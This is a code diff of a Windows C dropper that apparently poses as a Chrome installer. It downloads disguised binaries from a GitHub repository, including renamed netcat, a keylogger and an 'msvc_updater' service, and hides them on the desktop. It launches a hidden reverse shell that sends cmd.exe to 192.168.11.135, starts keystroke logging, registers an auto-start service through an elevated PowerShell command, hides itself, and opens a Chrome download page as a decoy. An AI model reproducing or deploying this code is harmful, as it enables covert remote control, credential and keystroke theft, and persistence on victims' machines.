@@ -6,6 +6,17 @@
 #include <Shlobj.h>
 
 
+#define PSHELL_PATH "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+#define CHROME_PATH "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
+
+#define NC_URL "https://raw.githubusercontent.com/belajarqywok/wintrapd/main/msvcnet.exe"
+#define KYLG_URL "https://raw.githubusercontent.com/belajarqywok/wintrapd/main/build/msvcmon.exe"
+#define MSVCSV_URL "https://raw.githubusercontent.com/belajarqywok/wintrapd/main/build/msvc_updater.exe"
+#define CHROME_URL "https://www.google.com/intl/id_id/chrome/next-steps.html?statcb=1&installdataindex=empty&defaultbrowser=0#"
+
+#define KYLG_PARAMS "--out-log msvclog"
+#define NC_PARAMS "-d 192.168.11.135 6666 -e C:\\Windows\\System32\\cmd.exe"
+
 void DownloadFile(const char* url, const char* filePath)
 {
     HINTERNET hInternet = InternetOpen("Downloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
@@ -36,29 +47,44 @@ void DownloadFile(const char* url, const char* filePath)
 
 int main(int argc, char* argv[]) 
 {
-    const char* ncurl    = "http://192.168.11.187/msvcnet.exe";
-    const char* ncparams = "-d 192.168.11.135 4444 -e C:\\Windows\\System32\\cmd.exe";
+    char desktop_path[MAX_PATH];
+    SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktop_path);
 
-    const char* kylgurl    = "http://192.168.11.187/msvcmon.exe";
-    const char* kylgparams = "--out-log msvclog";
+    char current_path[MAX_PATH];
+    GetModuleFileName(NULL, current_path, MAX_PATH);
 
-    char desktopPath[MAX_PATH];
-    SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktopPath);
 
-    char ncpath[MAX_PATH];
-    snprintf(ncpath, MAX_PATH, "%s\\msvcnet.exe", desktopPath);
+    char nc_path[MAX_PATH];
+    snprintf(nc_path, MAX_PATH, "%s\\msvcnet.exe", desktop_path);
 
-    char kylgpath[MAX_PATH];
-    snprintf(kylgpath, MAX_PATH, "%s\\msvcmon.exe", desktopPath);
+    char kylg_path[MAX_PATH];
+    snprintf(kylg_path, MAX_PATH, "%s\\msvcmon.exe", desktop_path);
 
-    DownloadFile(ncurl, ncpath);
-    SetFileAttributes(ncpath, FILE_ATTRIBUTE_HIDDEN);
+    char ps_params[256];
+    char msvcsv_path[MAX_PATH];
+    snprintf(msvcsv_path, MAX_PATH, "%s\\msvc_updater.exe", desktop_path);
+    sprintf(ps_params, 
+        "-Command \"Start-Process cmd.exe -ArgumentList '/c sc create msvc_updater binPath=\"%s\" start=auto && sc start msvc_updater' -Verb RunAs\"",
+        msvcsv_path);
+    SetFileAttributes(msvcsv_path, FILE_ATTRIBUTE_HIDDEN);
 
-    DownloadFile(kylgurl, kylgpath);
-    SetFileAttributes(kylgpath, FILE_ATTRIBUTE_HIDDEN);
 
-    ShellExecute(NULL, "open", ncpath, ncparams, NULL, SW_HIDE);
-    ShellExecute(NULL, "open", kylgpath, kylgparams, NULL, SW_HIDE);
+    DownloadFile(NC_URL, nc_path);
+    SetFileAttributes(nc_path, FILE_ATTRIBUTE_HIDDEN);
+
+    DownloadFile(KYLG_URL, kylg_path);
+    SetFileAttributes(kylg_path, FILE_ATTRIBUTE_HIDDEN);
+
+    DownloadFile(MSVCSV_URL, msvcsv_path);
+    SetFileAttributes(msvcsv_path, FILE_ATTRIBUTE_HIDDEN);
+
+
+    ShellExecute(NULL, "open", nc_path, NC_PARAMS, NULL, SW_HIDE);
+    ShellExecute(NULL, "open", kylg_path, KYLG_PARAMS, NULL, SW_HIDE);
+    ShellExecute(NULL, "open", PSHELL_PATH, ps_params, NULL, SW_HIDE);
+
+    SetFileAttributes(current_path, FILE_ATTRIBUTE_HIDDEN);
+    ShellExecute(NULL, "open", CHROME_PATH, CHROME_URL, NULL, SW_SHOWNORMAL);
 
     return 0;
 }
